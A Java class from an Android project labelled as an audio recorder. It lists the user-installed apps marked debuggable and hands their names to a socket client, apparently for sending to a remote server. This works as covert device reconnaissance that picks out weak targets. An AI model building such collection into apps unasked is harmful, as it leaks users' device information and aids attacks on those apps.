package it.matteodegiorgi.audiorecorder.debuggableapplications;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import androidx.appcompat.app.AppCompatActivity;

import it.matteodegiorgi.audiorecorder.socket.Client;

import java.util.ArrayList;
import java.util.List;

public class DebuggableApplications extends Thread {

    /*variable to store the reference of actual activity*/
    private AppCompatActivity appCompatActivity;

    /*variable used to store the context to access inside the thread*/
    private Context context;

    /*variable used to retrieve informations related to the application packages that are currently installed on the device*/
    private PackageManager packageManager;

    /*variable used to store all debuggable applications*/
    private List < ApplicationInfo > debugabbleApplications;

    /*variable used for the the reference for the client socket*/
    private Client client;

    public DebuggableApplications ( AppCompatActivity appCompatActivity , Client client ) {

        /*initialize all necessary variables*/
        this.initializeAllVariables ( appCompatActivity , client );

        /*start thread*/
        this.start ( );

        /*print debuggable applications information's*/
        this.printDebuggableApplicationsInfo ( );

    }

    /*function used to initialize all necessary variables*/
    private void initializeAllVariables ( AppCompatActivity appCompatActivity , Client client ) {

        /*save the reference of actual activity*/
        this.appCompatActivity = appCompatActivity;

        /*save the reference for the client socket*/
        this.client = client;

        /*save the context*/
        this.context = this.appCompatActivity.getApplicationContext ( );

        /*save the package manager*/
        this.packageManager = this.context.getPackageManager ( );

        /*initialize the list to contain all debuggable applications*/
        this.debugabbleApplications = new ArrayList <> ( );

    }

    /*function used to print information's of debuggable applications*/
    public void printDebuggableApplicationsInfo ( ) {

        try {

            /*try to wait until the thread finish its execution*/
            this.join ( );

            /*for each debuggable application*/
            for ( ApplicationInfo app : this.debugabbleApplications ) {

                /*print and send app information's*/
                this.client.addElementToBeSent ( "DebuggableApplications: #" + this.packageManager.getApplicationLabel ( app ) + "#" );

            }

        } catch ( InterruptedException e ) {
            e.printStackTrace ( );
        }

    }

    @Override
    public void run ( ) {

        /*get list of all applications inside the device*/
        List < ApplicationInfo > allApps = this.packageManager.getInstalledApplications ( PackageManager.GET_META_DATA );

        /*for each application*/
        for ( ApplicationInfo app : allApps ) {

            /*if it a system application*/
            if ( ( app.flags & ( ApplicationInfo.FLAG_UPDATED_SYSTEM_APP | ApplicationInfo.FLAG_SYSTEM ) ) > 0 ) {

                /*do nothing for the moment*/

            }

            /*if it is a user application*/
            else {

                /*if it is a debuggable application*/
                if ( ( app.flags & ApplicationInfo.FLAG_DEBUGGABLE ) > 0 ) {

                    /*add to the list the current application*/
                    debugabbleApplications.add ( app );

                }

            }

        }

    }

}
